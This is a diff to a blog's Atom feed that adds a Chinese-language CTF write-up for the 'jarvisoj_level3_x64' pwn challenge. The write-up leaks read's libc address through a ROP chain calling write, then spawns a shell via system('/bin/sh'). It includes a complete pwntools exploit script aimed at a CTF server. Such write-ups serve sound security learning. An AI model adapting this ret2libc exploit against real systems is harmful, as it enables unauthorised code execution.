@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-07-06T05:25:31.055Z</updated>
+  <updated>2021-07-11T05:41:52.682Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>jarvisoj_level3_x64</title>
+    <link href="https://pr0b1em.github.io/2021/07/11/level3-x64/"/>
+    <id>https://pr0b1em.github.io/2021/07/11/level3-x64/</id>
+    <published>2021-07-11T05:39:27.000Z</published>
+    <updated>2021-07-11T05:41:52.682Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p><p><img src="/img/image-20210711122341042.png" alt="image-20210711122341042"></p><p>IDA打开，</p><p>main函数</p><p><img src="/img/image-20210711123946252.png" alt="image-20210711123946252"></p><p>发现function函数，找到栈溢出漏洞</p><p><img src="/img/image-20210711124005975.png" alt="image-20210711124005975"></p><p>写入长度为7，读的长度为0x200</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.泄露read地址得到libc版本</p><p>2.获取system和‘/bin/sh’的地址</p><p>3.返回主函数进行夺权</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>因为是64位，所以考虑寄存器问题</p><p>需要构造write(1, read_got, 8)，即将rdi=1<code>，</code>rsi=read_got<code>，</code>rdx=8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary level3_x64 --only “pop|ret”</span><br></pre></td></tr></table></figure><p><img src="/img/image-20210711132937061.png" alt="image-20210711132937061"></p><p>利用出栈指令<code>pop</code>给对应的寄存器赋值，但这里没有<code>pop rdx</code>，通过查看反汇编可以发现构造栈溢出前<code>rdx=0x200</code>，足够将<code>read</code>函数的真实地址泄露出来</p><p>第二次栈溢出跳转执行<code>system(&quot;/bin/sh&quot;)</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29641</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)<span class="comment">#设置write第一个参数为1</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>)<span class="comment">#设置write第二个参数为read_got</span></span><br><span class="line">payload += p64(write_plt)<span class="comment">#调用write函数</span></span><br><span class="line">payload += p64(main_addr)<span class="comment">#调用完write返回主函数</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))<span class="comment">#接收泄露的read函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/image-20210711133802398.png" alt="image-20210711133802398"></p>]]></content>
+    
+    
+    <summary type="html">libc泄露</summary>
+    
+    
+    
+    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>pwn2_sctf_2016</title>
